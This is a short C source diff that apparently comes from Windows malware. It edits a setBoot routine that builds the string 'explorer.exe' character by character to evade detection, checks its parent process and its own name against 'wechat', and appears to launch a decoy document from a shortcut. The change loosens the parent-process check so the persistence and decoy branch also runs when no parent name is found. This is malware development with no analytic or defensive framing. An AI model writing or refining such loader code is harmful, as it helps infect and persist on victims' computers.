@@ -248,7 +248,8 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 		char szexplorer[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
 		char szParentProcName[MAX_PATH];
 		iRet = GetParentProcName(szParentProcName);
-		if (lplstrcmpiA(szParentProcName, szexplorer) == 0 && lstrcmpiA(szwechat, szExeName) != 0)
+		//MessageBoxA(0, szParentProcName, szParentProcName, MB_OK);
+		if ((szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0) && lstrcmpiA(szwechat, szExeName) != 0)
 		{
 			char strShowFileName[MAX_PATH] = { 0 };
 			char* pShowFileName = GetLinkDocFileName(strShowFileName, szCurrentPath);
@@ -312,7 +313,7 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 			}
 		}
 
-		if (lplstrcmpiA(szParentProcName, szexplorer) == 0)
+		if (szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0)
 		{
 			if (lstrcmpiA(szwechat, szExeName) == 0)
 			{
